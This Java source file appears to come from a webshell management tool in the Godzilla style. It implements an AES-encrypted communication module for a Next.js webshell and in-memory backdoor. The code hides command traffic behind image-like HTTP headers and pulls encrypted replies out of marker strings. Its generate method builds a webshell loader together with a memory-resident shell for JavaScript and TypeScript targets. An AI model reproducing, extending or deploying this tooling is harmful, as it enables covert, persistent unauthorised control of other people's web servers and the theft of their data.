package shells.cryptions.jsAes;

import core.annotation.CryptionAnnotation;
import core.annotation.PropertyAnnotation;
import core.imp.Cryption;
import core.shell.ShellEntity;
import java.io.ByteArrayOutputStream;
import java.net.URLEncoder;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import shells.channel.HttpRequestChannel;
import shells.channel.RequestChannel;
import util.Log;
import util.functions;

@CryptionAnnotation(
        Name = "JS_AES_MEMSHELL",
        payloadName = "NextJsDynamicPayload"
)
public class JsAesMemShell implements Cryption {
    private ShellEntity shell;
    private RequestChannel request;
    private Cipher decodeCipher;
    private Cipher encodeCipher;
    private String key;
    private boolean state;
    private byte[] payload;
    private byte[] findStrLeft;
    private String pass;
    private byte[] findStrRight;
    @PropertyAnnotation(
            Name = "suffix",
            Value = "js;ts;"
    )
    private String suffix;

    @PropertyAnnotation(
            Name = "generateMemshell",
            Value = "true"
    )
    private String generateMemshell;

    public void init(ShellEntity context) {
        this.shell = context;
        this.request = new HttpRequestChannel(context);
        context.setRequest(this.request);
        this.key = this.shell.getSecretKeyX();
        this.pass = this.shell.getPassword();
        String findStrMd5 = functions.md5(this.pass + this.key);
        this.findStrLeft = findStrMd5.substring(0, 16).toUpperCase().getBytes();
        this.findStrRight = findStrMd5.substring(16).toUpperCase().getBytes();

        java.util.LinkedHashMap<String, java.util.LinkedList<String>> headers = this.shell.getHeaders();
        if (headers == null) {
            headers = new java.util.LinkedHashMap<>();
        }
        java.util.LinkedList<String> acceptValues = new java.util.LinkedList<>();
        acceptValues.add("image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8");
        acceptValues.add("gzipp");
        headers.put("Accept", acceptValues);
        this.shell.setHeaders(headers);

        try {
            this.encodeCipher = Cipher.getInstance("AES");
            this.decodeCipher = Cipher.getInstance("AES");
            this.encodeCipher.init(1, new SecretKeySpec(this.key.getBytes(), "AES"));
            this.decodeCipher.init(2, new SecretKeySpec(this.key.getBytes(), "AES"));
            this.shell.getPayloadModule().init(shell);
            this.payload = this.shell.getPayloadModule().getPayload();
            if (this.payload != null) {
                this.request.sendRequest(this.payload);
                this.state = true;
            } else {
                Log.error("payload Is Null");
            }

        } catch (Exception e) {
            Log.error(e);
        }
    }

    public synchronized byte[] encode(byte[] data) {
        try {
            return (this.pass + "=" + URLEncoder.encode(functions.base64EncodeToString(this.encodeCipher.doFinal(data)))).getBytes();
        } catch (Exception e) {
            Log.error(e);
            return null;
        }
    }

    public synchronized byte[] decode(byte[] data) {
        try {
            String responseStr = new String(data, "UTF-8");
            String base64Data = null;

            if (responseStr.trim().startsWith("{")) {
                try {
                    base64Data = extractJsonField(responseStr, "data");
                } catch (Exception jsonEx) {
                }
            }

            if (base64Data == null) {
                byte[] extracted = this.findStr(data);
                if (extracted != null) {
                    base64Data = new String(extracted, "UTF-8");
                }
            }

            if (base64Data == null) {
                Log.error("Failed to extract data from response");
                return null;
            }

            data = functions.base64Decode(base64Data);
            return this.decodeCipher.doFinal(data);
        } catch (Exception e) {
            Log.error(e);
            return null;
        }
    }

    private String extractJsonField(String json, String fieldName) {
        try {
            json = json.trim();
            String searchKey = "\"" + fieldName + "\"";
            int keyIndex = json.indexOf(searchKey);
            if (keyIndex == -1) {
                return null;
            }

            int colonIndex = json.indexOf(":", keyIndex + searchKey.length());
            if (colonIndex == -1) {
                return null;
            }

            int valueStart = colonIndex + 1;
            while (valueStart < json.length() && Character.isWhitespace(json.charAt(valueStart))) {
                valueStart++;
            }

            if (valueStart >= json.length() || json.charAt(valueStart) != '"') {
                return null;
            }

            valueStart++;
            int valueEnd = json.indexOf('"', valueStart);

            if (valueEnd == -1) {
                return null;
            }

            String value = json.substring(valueStart, valueEnd);
            return value;
        } catch (Exception e) {
            Log.error("extractJsonField error: " + e.getMessage());
            return null;
        }
    }

    public byte[] findStr(byte[] respResult) {
        byte[] content = functions.subMiddleBytes(respResult, this.findStrLeft, this.findStrRight);
        if (content == null) {
            return null;
        } else {
            ByteArrayOutputStream baos = new ByteArrayOutputStream(content.length);

            for(int i = 0; i < content.length; ++i) {
                byte b = content[i];
                if (b != 10 && b != 13) {
                    baos.write(b);
                }
            }

            return baos.toByteArray();
        }
    }

    public boolean isSendRLData() {
        return true;
    }

    public boolean check() {
        return this.state;
    }

    public String getSuffix() {
        return this.suffix;
    }

    public byte[] generate(String password, String secretKey) {
        String processedKey = functions.md5(secretKey).substring(0, 16);

        boolean shouldGenerateMemshell = true;
        if (this.generateMemshell != null) {
            shouldGenerateMemshell = "true".equalsIgnoreCase(this.generateMemshell.trim());
        }

        if (shouldGenerateMemshell) {
            Log.log("正在生成 Webshell 和内存马 JSON...");
            return Generate.GenerateShellLoderWithMemshell(this.suffix, password, processedKey, "base64", true);
        } else {
            return Generate.GenerateShellLoder(this.suffix, password, processedKey, "base64");
        }
    }
}
